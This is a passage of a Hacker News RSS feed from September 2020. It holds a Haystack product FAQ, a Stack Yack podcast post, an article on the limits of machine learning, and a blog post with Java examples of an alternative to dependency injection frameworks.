href="https://www.apple.com/ios/app-store/"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb051822d5c8_button-app-store-saasy-template.svg" alt=""></a></p><p><a href="https://play.google.com/store"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb518f22d5c9_button-google-play-saasy-template.svg" alt=""></a></p></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png 1150w" sizes="100vw" data-w-id="e1c697c3-7ab8-9d09-98e0-f8be7cf200ed" alt=""></p></div></div></section><section id="FAQ"><div data-w-id="82ef7066-8d32-d493-5388-c4c2d2c5d587"><p>FAQs</p><h2>Frequently Asked Questions</h2><p>Have questions? We’ve answers. If you can’t find what we are looking for, feel free to <a href="mailto:julian@usehaystack.io?subject=I%20have%20a%20question">get in touch</a>.</p></div><div><div><div data-w-id="3617354b-55d5-2b8b-9640-458190b21b06"><div data-delay="0" data-w-id="7708a86a-a613-5bc5-c125-ed8935e5b91c"><div><p>How does it work?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack plugs directly into your repositories using the Github API. We analyze the past 6 months of historical data to determine 'healthy area' for each team, repository, and member. Our system compares incoming activity to success heuristics we've collected over the years so things look out of the ordinary or worth noting - we'll tell you about. Simple as that.</p></nav></div><div data-delay="0" data-w-id="ff73c91b-7b6b-02ad-ffcb-97993103d63c"><div><p>How do I&nbsp;set it up?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>1. Create a Haystack Account<br>2. Install our Github App<br>3. Choose which repositories to plug into Haystack<br>4. Sit back and relax while insights roll into your inbox</p></nav></div><div data-delay="0" data-w-id="29e7d9a4-79c8-dee3-b804-7ae25b5c1a6d"><div><p>Do you have a demo?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>We don't have a live demo to share at the moment. With that said, we'd be happy to walk you through our own team's internal dashboard. Just email us at sales@usehaystack.io and we'll show you how it works!</p></nav></div><div data-delay="0" data-w-id="c403712e-e2f6-bb93-d607-e35a8eec7460"><div><p>Is it secure?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack does not store, read or access any of your source code. We simply use the timestamps and metadata on pull requests so your code is safe.</p></nav></div><div data-delay="0" data-w-id="ce364f13-3101-3764-a412-acdc61fe8df0"><div><p>Does it work with BitBucket or Gitlab?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack is built to support all version control platforms but at the moment we have a waitlist for Gitlab and Bitbucket users. On-premise solutions are supported with our Enterprise plan and if you need a custom integration just let us know at sales@usehaystack.io</p></nav></div></div></div></div></section><div><div data-w-id="a3e18c38-b5e1-16c3-1f84-aa2f003da28c"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section></section></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/alerts</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519959</guid>
            <pubDate>Fri, 18 Sep 2020 18:05:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“I almost died twice..”, a conversation with Weedmaps developer Kent Kawahara]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24519925">thread link</a>) | @stackyacker
<br/>
September 18, 2020 | https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara | <a href="https://web.archive.org/web/*/https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><svg width="250" height="28" viewBox="0 0 250 28" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 10.0405C47.449 10.0405 90.7725 7.64212 134.135 6.12911C168.179 4.94125 202.779 6.98535 236.657 4.27458C238.06 4.16231 249.568 3.69847 242.978 4.3083C222.385 6.21398 201.778 8.15799 181.043 9.39982C139.422 11.8926 97.5315 11.4142 55.8987 13.7158C52.5174 13.9027 49.4931 14.289 46.0291 14.289C19.2952 14.289 99.4723 15.4441 126.206 15.5029C148.996 15.553 171.002 14.9327 193.63 13.817C204.771 13.2676 181.518 14.9943 179.768 15.0308C160.98 15.4233 141.617 14.7726 122.99 16.447C115.197 17.1476 133.942 17.7196 135.632 17.7958C139.117 17.9528 144.692 17.7667 147.83 18.8748C151.656 20.2257 139.112 19.7946 134.745 20.2235C128.945 20.7931 123.956 21.4568 119.774 24" stroke="#FF0000" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"></path></svg><b>Fri Sep 18 2020</b></header><p><iframe src="https://www.youtube.com/embed/AnPLM5o45cg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><div><p>Hello, world! Thanks for tuning into the 15th edition of Stack Yack. </p><p>15 weeks strong here folks. When I first started SY, my biggest concern was how the hell am I going to create new content every week?! Surprisingly, it's hasn't been too hard. In fact, I've been a making content 1-2 weeks ahead of schedule now. Anyway, just tooting my own horn here a bit and how stoked I am about SY. </p><p>Side note - I'm definitely looking for help on how to grow it across various social channels, so if you are able to help or know someone who can, please reach out to christianlovescode@gmail.com :) </p><p>Okay, let's get into it. </p><p>This week (or last week rather), I caught up with Kent K - Senior SWE and former colleague of mine at Weedmaps, in Irvine, CA. We dive into what it's like to work at Weedmaps, how it's changed since COVID, pair programming, learning to code, how he almost died twice and his insanely useful app to help prevent that, staying healthy, and much much more. </p><p>This is a rather long episode, but lots of good nugs&nbsp;😉 along the way you'll find valuable. </p><p>As always thanks for tuning in, and I'm super grateful to have you as a Stack Yack supporter. </p><p>Enjoy the weekend! Christian</p></div><p>Thanks for tuning in,</p></article></div>]]>
            </description>
            <link>https://stackyack.tv/post/stack-yack-015-talking-shop-with-kent-kawahara</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519925</guid>
            <pubDate>Fri, 18 Sep 2020 18:02:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why some artificial intelligence is smart until it’s dumb]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519726">thread link</a>) | @sinapticasblog
<br/>
September 18, 2020 | https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/ | <a href="https://web.archive.org/web/*/https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><em><strong>Cover image: Xavier Cortada – “In search of the Higgs boson”</strong></em></p>



<p>Machine learning has found uses in fields as diverse as particle physics and radiology, and its influence is growing. But so is the understanding of its limits.</p>



<p>By Tom Siegfried</p>



<p>8.27.2020</p>



<p>It’s Stardate 47025.4, in the 24th century. Starfleet’s star android, Lt. Commander Data, has been enlisted by his renegade android “brother” Lore to join a rebellion against humankind — much to the consternation of Jean-Luc Picard, captain of the USS Enterprise. “The reign of biological life-forms is coming to an end,” Lore tells Picard. “You, Picard, and those like you, are obsolete.”</p>



<p>That’s <em>Star Trek</em> for you — so optimistic that machines won’t dethrone humans until at least three more centuries. But that’s fiction. In real life, the era of smart machines has already arrived. They haven’t completely taken over the world yet, but they’re off to a good start.</p>



<p>“Machine learning” — a sort of concrete subfield within the more nebulous quest for artificial intelligence — has invaded numerous fields of human endeavor, from medical diagnosis to searching for new subatomic particles. Thanks to its most powerful incarnation — known as deep learning — machine learning’s repertoire of skills now includes recognizing speech, translating languages, identifying images, driving cars, designing new materials and predicting trends in the stock market, among uses in many arenas.</p>



<p>“Because computers can effortlessly sift through data at scales far beyond human capabilities, deep learning is not only about to transform modern society, but also about to revolutionize science — crossing major disciplines from particle physics and organic chemistry to biological research and biomedical applications,” computational neuroscientist Thomas Serre wrote in the 2019 <a href="https://www.annualreviews.org/doi/10.1146/annurev-vision-091718-014951" target="_blank" rel="noreferrer noopener"><em>Annual Review of Vision Science</em></a>.</p>



<p>A proliferation of new papers on machine learning, deep learning and artificial intelligence have flooded the scientific literature in recent years. Reviews of this new research have covered such topics as health care and epidemiology, materials science, fundamental physics, quantum computing, simulations of molecular interactions, fluid mechanics, clinical psychology, economics, vision science and drug discovery.</p>



<p>These reviews spotlight machine learning’s major accomplishments so far and foretell even more substantial achievements to come. But most such reviews also remark on intelligent machines’ limitations. Some impressive successes, for instance, reflect “shortcut” learning that gets the right answer without true understanding. Consequently, apparently smart machines can be easily tricked into error. And much of today’s so-called machine intelligence is narrowly focused skill, effective for a specific task, but without the flexibility of the general cognitive abilities possessed by people. A computer that can beat grandmasters at chess would be mediocre at poker, for example.</p>



<p>“In stark contrast with humans, most ‘learning’ in current-day artificial intelligence is not transferable between related tasks,” writes computer scientist Melanie Mitchell in her 2019 book <em>Artificial Intelligence: A Guide for Thinking Humans</em>.</p>



<p>As Mitchell explains, many barriers impede the quest for true artificial intelligence — machines that can think and reason about the world in a general way as (at least some) humans can.</p>



<p>“We humans tend to overestimate artificial intelligence advances and underestimate the complexity of our own intelligence,” Mitchell writes. Fears of superintelligent machines taking over the world are therefore misplaced, she suggests, citing comments by the economist and behavioral scientist Sendhil Mullainathan: “We should be afraid,” he wrote. “Not of intelligent machines. But of machines making decisions that they do not have the intelligence to make. I am far more afraid of machine stupidity than of machine intelligence.”</p>



<div><figure><img data-attachment-id="2024" data-permalink="https://sinapticas.com/417mt-a7wl/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg" data-orig-size="333,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="417mt-a7wl" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=200" data-large-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=333" src="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=333" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg 333w, https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=100 100w, https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=200 200w" sizes="(max-width: 333px) 100vw, 333px"><figcaption>Computer scientist and scholar Melanie Mitchell’s 2019 book explains the capabilities and the limits of current artificial intelligence.</figcaption></figure></div>



<h2>Machine learning’s swift progress</h2>



<p>To be fair, computer scientists have developed some pretty powerful strategies for teaching machines how to learn. Typically such learning relies on some variant of computing systems known as <a href="https://www.knowablemagazine.org/article/technology/2018/truly-neurally-deeply" target="_blank" rel="noreferrer noopener">neural networks</a>. In a crude way, those networks emulate the human brain, with processing units based on the brain’s nerve cells, or neurons. In a traditional neural network, a layer of artificial neurons receives inputs that modify the strength of the connections to the neurons in another layer, where patterns in the input can be identified and reported to an output layer. Such an artificial neural network can “learn” how to classify input data as, say, an image of a cat.</p>



<p>In the last decade or so, the dominant machine learning strategy has relied on artificial neural networks with multiple layers, a method known as deep learning. A deep learning machine can detect patterns within patterns, enabling more precise classifications of input, exceeding the ability of even expert humans. A well-trained deep learning system can detect a signal of cancer in an CT scan that would elude a human radiologist’s eyes.</p>



<p>In some systems, the learning is “supervised,” meaning the machine is trained on labeled data. With unsupervised learning, machines are trained on large datasets without being told what the input represents; the computer itself learns to identify patterns that define categories or behaviors. In another approach, called reinforcement learning, a machine learns to respond to input with actions that are “rewarded” (perhaps by adding numbers to a memory file) if they help achieve a goal, such as winning a game. Reinforcement learning demonstrated its power by producing the machine that beat the human champion in the game of Go.</p>



<p>But success at Go, while worthy of headlines, is not nearly as notable as machine learning’s more practical successes in such realms as medicine, industry and science.</p>



<figure><img data-attachment-id="2025" data-permalink="https://sinapticas.com/1mukvfmpi6emzopvcgv1rbg/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg" data-orig-size="1350,621" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1mukvfmpi6emzopvcgv1rbg" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=672" src="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=1024" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=1024 1024w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=300 300w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=768 768w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg 1350w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Professional Go player Lee Sodol, right, faced Google’s artificial intelligence program AlphaGo in a series of Go games in 2016. Google DeepMind’s lead programmer Aja Huang, left, placed the first stone during the final match. AlphaGo won many, but not all, games against its human competitors.</figcaption></figure>



<p>In medicine, machine learning has helped researchers cope with weaknesses in standard tests for treatment effectiveness. Medical trials testing disease treatments typically rely on average results to determine effectiveness, and can therefore miss possible benefits for small subgroups of patients. One trial, for instance, found that a weight-loss program did not reduce heart problems among people with diabetes. But a machine learning algorithm identified a subset of patients for which weight loss did reduce heart problems, as infectious disease expert Timothy Wiemken and computer scientist Robert Kelley noted in the 2020 <a href="https://www.annualreviews.org/doi/10.1146/annurev-publhealth-040119-094437" target="_blank" rel="noreferrer noopener"><em>Annual Review of Public Health</em></a> <em>.</em></p>



<p>Machine learning has also assisted in finding new drugs to test. “Deep learning has been widely applied to drug discovery approaches,” chemist Hao Zhu writes in the latest<em> <a href="https://www.annualreviews.org/doi/10.1146/annurev-pharmtox-010919-023324" target="_blank" rel="noreferrer noopener"><em>Annual Review of Pharmacology and Toxicology</em></a>. “The current progress of artificial intelligence supported by deep learning has shown great promise in rational drug discovery in this era of big data.”</em></p>



<p><em>As with discovering new drugs for medical purposes, machine learning has proved productive in discovering new materials for industrial uses. Searching for “superhard” materials resistant to wear and tear can be streamlined with machine learning algorithms, as in a case study described in the 2020 Annual Review of Materials Research. “This case study … is an excellent example of the powerful role that machine learning can play in the identification of new structural materials,” materials scientist Taylor Sparks and colleagues <a href="https://www.annualreviews.org/doi/10.1146/annurev-matsci-110519-094700" target="_blank" rel="noreferrer noopener">wrote in that review</a>.</em></p>



<p><em>“I am far more afraid of machine stupidity than of machine intelligence.”</em><em>Sendhil Mullainathan</em></p>



<p><em>While practical uses get the most attention, machine learning also offers advantages for basic scientific research. In high-energy particle accelerators, such as the Large Hadron Collider near Geneva, protons smashing together produce complex streams of debris containing other subatomic particles (such as the famous Higgs boson, discovered at the LHC in 2012). With bunches containing billions of protons colliding millions of times per second, physicists must wisely choose which events are worth studying. It’s kind of like deciding which molecules to swallow while drinking from a firehose. Machine learning can help distinguish important events from background noise. Other machine algorithms can help identify particles produced in the collision debris.</em></p>



<p><em>“Deep learning has already influenced data analysis at the LHC and sparked a new wave of collaboration between the machine learning and particle physics communities,” physicist Dan Guest and colleagues wrote in the 2018 <a href="https://www.annualreviews.org/doi/10.1146/annurev-nucl-101917-021019" target="_blank" rel="noreferrer noopener"><em>Annual Review of Nuclear and Particle Science</em></a>.</em></p>



<p><em>Machine learning methods have been applied to data processing not only in particle physics but also in cosmology, quantum computing and other realms of fundamental physics, quantum physicist Giuseppe Carleo and colleagues point out in <a href="https://arxiv.org/abs/1903.10563" target="_blank" rel="noreferrer noopener">another recent review</a>.</em></p>



<p><em>“In parallel to the rise of machine learning techniques in industrial applications, scientists have increasingly become interested in the potential of machine learning for fundamental research,” Carleo and coauthors wrote last year in Reviews of Modern Physics.</em></p>



<h2><em>Limits on learning</em></h2>



<p><em>As Carleo and many other reviewers have emphasized, machine learning has its downsides. Its successes should not blind scientists to its faults.</em></p>



<p><em>“A healthy and critical engagement with the potential power and limitations of machine learning includes an analysis of where these methods break and what they are distinctly not good at,” Carleo and coauthors wrote.</em></p>



<p><em>For …</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/">https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/</a></em></p>]]>
            </description>
            <link>https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519726</guid>
            <pubDate>Fri, 18 Sep 2020 17:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Alternative to Dependency Injection Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519596">thread link</a>) | @whack
<br/>
September 18, 2020 | https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://blog.nrwl.io/essential-angular-dependency-injection-a6b9dcca1761" target="_blank" rel="noreferrer noopener"><img loading="lazy" data-attachment-id="163" data-permalink="https://software.rajivprab.com/di/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" data-orig-size="1115,569" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="di" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024" src="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" alt="" width="558" height="285" srcset="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=558&amp;h=285 558w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=150&amp;h=77 150w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300&amp;h=153 300w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=768&amp;h=392 768w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024&amp;h=523 1024w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png 1115w" sizes="(max-width: 558px) 100vw, 558px"></a></figure></div>



<p><span>I have a confession to make. I hate </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Dependency_injection_frameworks" target="_blank" rel="noopener">Dependency Injection (DI) frameworks</a><span>. </span></p>



<p><span>My very first job as a Software Engineer involved working with a very complex system that powered a ~100 person hedge fund. We made extensive use of Dependency Injection… but only via </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Constructor_injection" target="_blank" rel="noopener">Constructor or Setter Injection</a><span>. We did not use any DI frameworks at all. Little did I realize how lucky I was.</span></p>



<p><span>I have since worked with Java code bases, much less complex in scope, but absolutely littered with DI annotations everywhere. I’ve worked with frameworks that took DI to the next level – even method parameters were injected by other methods that dynamically produced them when needed. To my untrained eye, it seemed like a colossal mess. Tracing anything took forever. Everything was implicitly linked to everything else. Maintaining the configs for every app and every test was a chore. Things that could have been a simple compile-time error flagged by my IDE, instead exposed themselves as run-time errors that were a pain to debug and fix. </span></p>



<p><span>Is all this really necessary? Why do we need all these annotation-driven magically-wired DI frameworks?</span></p>



<h2><span>Dependency Graphs</span></h2>



<p><span>I went searching for an explanation, and found one from </span><a href="https://blog.drewolson.org/dependency-injection-in-go" target="_blank" rel="noopener">the following blog post</a><span>:</span></p>



<blockquote><p><i><span>The main downside is that it’s a pain to have to manually create the Config before we can create the Server. We’ve created a dependency graph here – we must create our Config first because of Server depends on it. In real applications these dependency graphs can become very large and this leads to complicated logic for building all of the components your application needs to do its job.</span></i></p></blockquote>



<p><span>He then goes on to give an example of a Server, which has a chain of dependencies – all of which need to be constructed in sequence, by a centralized main function:</span></p>


<pre title="">func main() {
  config := NewConfig()
  db := ConnectDatabase(config)
  personRepository := NewPersonRepository(db)
  personService := NewPersonService(config, personRepository)
  server := NewServer(config, personService)
  server.Run()
}
</pre>


<p><span>His point presumably is that managing this dependency graph from a central location, can be complex and burdensome. Hence, it’s better to use a DI framework where you can specify how each dependency should be constructed, and they are all transitively invoked and initialized when needed.</span></p>



<p><span>I think that he is somewhat overstating the problems of constructor injection, but let’s assume for now that he’s right. Is there a different way to accomplish the above goal, without having to use a DI framework, and annotation-driven auto-wiring?</span></p>



<h2><span>An Alternative</span></h2>



<p><span>Turns out that I had run into a similar issue myself while working on some side projects. And I had solved them in a way that “resembles” a DI framework, without actually using any DI framework or advanced language constructs. I’m probably biased, but this approach appears to be far simpler, while conferring similar benefits.</span></p>



<p><span>Context: </span></p>



<ol><li><span>We want to construct and run a Server instance</span></li><li><span>Server has a dependency on PersonService</span></li><li><span>PersonService has a dependency on PersonRepository and Config</span></li><li><span>PersonRepository has a dependency on Database</span></li><li><span>Database has a dependency on the same Config as above</span></li></ol>



<p><span>Suppose, as the author mentions, we do not want to use constructor injection in order to inject Config -&gt; Database + Config -&gt; PersonRepo -&gt; PersonService -&gt; Server. Suppose we want all dependencies to be lazily, and transitively constructed only when needed.</span></p>



<p><span>Consider the following:</span></p>


<pre title="">public class Toolbox {
  public static Config getConfig() {...}
  public static Database getDatabase() {...}
  public static PersonRepo getPersonRepo() {...}
  public static PersonService getPersonService() {...}
}
</pre>


<p><span>If you have the above fully implemented, it can be trivially used to replace framework-based dependency injection. For instance, suppose you have a class that has a dependency on Database. Instead of relying on the DI framework to inject Database, you can just fetch it from the Toolbox instead.</span></p>


<pre title="">@Inject
public PersonRepo(@Database Database db) {...}
</pre>


<p><span>Becomes:</span></p>


<pre title="">public PersonRepo() { this(Toolbox.getDatabase()); }
public PersonRepo(Database db) {...}
</pre>


<h2><span>Configuring the Toolbox</span></h2>



<p><span>That all sounds great, but where does </span><code>Toolbox.getDatabase()</code><span> get its return value from? There are many possible ways to implement this, depending on your specific application and testing needs.</span> Let’s look at a few of them.</p>



<p><span>Simplest possible option: construct a new instance every time:</span></p>


<pre title="">public class Toolbox {
  public static Database getDatabase() { 
    return DatabaseProvider.get(); }
  }
  
  private static class DatabaseProvider {
    static Database get() { 
      return buildDatabase(Toolbox.getConfig()); 
    }
  }
}
</pre>


<p><span>Or if you want to reuse the same Database instance every time, you can use a </span><a rel="noopener" href="https://stackoverflow.com/a/16106598/4816322" target="_blank">singleton holder with lazy-initialization</a><span>:</span></p>


<pre title="">class DatabaseProvider {
  static Database get() { return DefaultHolder.DEFAULT; }

  private static class DefaultHolder {
    private static final DEFAULT = buildDatabase(Toolbox.getConfig());
  }
}
</pre>


<p><span>And suppose you want the ability to inject custom instances, for testing purposes:</span></p>


<pre title="">// Restrict visibility to prevent access from unexpected sources
class DatabaseProvider {
  // throws exception if already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) {...}

  // Returns a default if not set
  static Database get() {...}
}
</pre>


<p><span>And if you want all this to be thread-safe, you can use </span><a rel="noopener" href="https://dzone.com/articles/how-atomicreference-works-in-java" target="_blank">AtomicReference</a><span>. Or you could use a </span><a href="https://gitlab.com/whacks/cava/blob/master/src/main/java/org/rajivprab/cava/DynamicConstant.java"><span>simple utility class that manages thread safety, lazy init, defaults, and immutability</span></a><span>, in order to implement all this in just 5 lines of code.</span></p>


<pre title="">class DatabaseProvider {
  private static final DynamicConstant INSTANCE = 
    DynamicConstant.withDefault(() -&gt; buildDatabase(Toolbox.getConfig()));

  // throws exception if instance is already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) { INSTANCE.set(db); }

  static Database get() { return INSTANCE.get(); }
}
</pre>


<p>You can customize this to fit any particular requirements you have. Thread-safety, immutability, defaults, singletons vs suppliers, injecting fakes for tests – you can implement any of these simply by customizing the DatabaseHolder implementation.</p>



<p><span>Notice that this automatically manages your dependency graph as well. When&nbsp;<code>Toolbox.getDatabase()</code> is invoked, that invokes <code>DatabaseProvider.get()</code>,&nbsp;which will then invoke <code>Toolbox.getConfig()</code><em> </em>if needed, which might in turn transitively invoke its own dependencies via the Toolbox as well.</span></p>



<p><span>In this way, <code>PersonRepo</code> only needs to call <code>Toolbox.getDatabase()</code>, and all transitive dependencies are lazily initialized or constructed (if needed), in order to generate the Database instance.</span></p>



<h2>So… Service Locators?</h2>



<p>Given the superficial similarity to <a href="https://en.wikipedia.org/wiki/Service_locator_pattern" target="_blank" rel="noopener">Service Locators</a>&nbsp;(SL), it’s easy to see why this might seem like a reincarnation of an old idea. However, there are some major differences between the approach described above, and a traditional SL pattern. Differences that completely change the way the system feels and operates.</p>



<p>First, unlike a SL, the above approach cannot be used to request any arbitrary object. The Toolbox only has specific methods defined, such as <code>getDatabase()</code>, which return specific objects. You cannot simply invoke <code>Toolbox.get(MyCustomObject.class)</code>, like you can with a SL.</p>



<p>This restriction might seem like a limitation. But it actually makes your code much safer. It guarantees that all Toolbox users are only using it to request objects that have been explicitly planned for and added to the Toolbox interface. It also allows for programmers to easily figure out which dependencies they can safely get from the Toolbox, and which ones they have to get elsewhere.</p>



<p>The above also provides an additional level of safety: you can ensure that every method exposed by the Toolbox, comes with a default supplier. A default supplier that eliminates any worries that the Toolbox wasn’t properly initialized prior to use. A default supplier that transitively constructs its own dependencies using the Toolbox recursively.</p>



<p>In fact, the right way to do it would be to define default suppliers that always return something that works, and is intended for production use. This way, when running in prod, your code should never have to set any values in the toolbox. It can simply get the lazy-constructed defaults whenever needed. The only use case for setting something in the Toolbox, would be for testing purposes when you want to inject a fake.</p>



<p>Lastly, a SL is designed and intended to be extremely flexible, by allowing for instance injection at any time. This can be a powerful tool, if your application needs such dynamic abilities. However, it can also lead to complex interactions and side-effects as different parts of the application interfere with each other in unintentional or non-intuitive ways.</p>



<p>The Toolbox approach described above isn’t expressly designed to have such capabilities. If you look at the various set methods, you can see that they are programmed to throw exceptions if they conflict with a previously set value. This means that as soon as a value is set, it is then frozen for the rest of the application’s lifespan. You can always customize this in any way you want, by changing the Provider implementation – but I would recommend enforcing some form of consistency.</p>



<p>Combine all of these differences, and you get something that’s completely different from a Service Locator in terms of its uses and drawbacks.</p>



<h2>But Singletons are Bad?</h2>



<p>With respect to Singletons, there’s little difference between the Toolbox approach above, and what you would do with DI frameworks. If you want a new instance every time, you can configure the DatabaseProvider to construct a new instance every time. Alternatively, if you prefer to reuse the same instance every time because …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519596</guid>
            <pubDate>Fri, 18 Sep 2020 17:34:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Network-Enabled Anarchy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519511">thread link</a>) | @bra-ket
<br/>
September 18, 2020 | https://ncri.io/reports/network-enabled-anarchy/ | <a href="https://web.archive.org/web/*/https://ncri.io/reports/network-enabled-anarchy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content" role="main">
	<div>
		<div>
			<div>
			    			    <article id="post-447">
				    <header>
